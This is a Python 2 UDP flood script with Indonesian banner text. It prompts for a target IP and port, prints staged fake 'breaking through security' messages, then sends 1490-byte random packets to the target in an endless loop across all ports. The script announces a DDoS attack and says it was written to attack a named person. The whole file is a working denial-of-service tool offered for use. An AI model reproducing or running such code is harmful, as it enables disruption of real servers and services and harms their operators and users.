print ("\033[92m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print("""\033[1;31m \033[[92m

  /                                         /
 / |                                       / |
 | |                                       | |
 | |                                       | |      /\
 | |  /\            /\ /\                  | |      \/
 | |  \/            \/ \/                  | |     /\ \
 \ \____/ \______/ \______/ \___/\__/ \____/ |_____|_| |
  \______/\_______/\______/\____/\___/\____/\_________/
            /\ /\
            \/ \/
_________________________________________________________


_________________________________________________________
""")
print(" ")
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
print("BIRUH BIDDAM NAFDIKA YAA AQSHA")
print ("\033[92m")
print "________________BERSIAP UNTUK MENCARI SERVER_____________________"
time.sleep(5)
print "____________________MULAI MEMATUK KONEKSI_______________________"
time.sleep(5)
print "____________0100100 MENEMBUS LAPISAN KEAMANAN 001010_______________"
time.sleep(5)
print "_______________________KONEKSI DICIPTAKAN________________________"
time.sleep(5)
print "    DDOS ATTACK STARTED. NOTE: SCRIPT INI DIBUAT UNTUK NABOKIN SRIWILL"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
